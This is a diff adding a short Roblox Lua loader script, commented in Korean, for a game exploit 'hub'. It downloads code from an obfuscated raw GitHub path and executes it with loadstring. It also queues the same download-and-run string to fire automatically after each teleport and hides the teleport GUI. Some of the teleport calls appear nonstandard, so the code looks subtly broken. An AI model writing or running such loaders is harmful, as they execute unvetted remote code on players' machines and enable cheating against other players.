@@ -1,0 +1,17 @@
+-- 메인 허브 스크립트 (시작 부분에 추가)
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- 여기에 니미 허브 전체 코드를 저장 (string 형태로)
+local HubScript = [==[
+loadstring(game:HttpGet("https://raw.githubusercontent.com/regentcon/axochs/refs/heads/main/%25%26%5Eaxochs%25%26%5E"))() -- 니미 허브 실제 로딩 코드
+]==]
+
+-- 텔레포트 시 다음 서버에서 자동 실행되도록 등록
+TeleportService:SetTeleportSetting("custom", true)
+TeleportService:SetTeleportGui(nil) -- 텔레포트 GUI 제거
+TeleportService:QueueOnTeleport(HubScript)
+
+-- 허브 로딩도 여기서 바로 실행
+loadstring(game:HttpGet("https://raw.githubusercontent.com/regentcon/axochs/refs/heads/main/%25%26%5Eaxochs%25%26%5E"))()
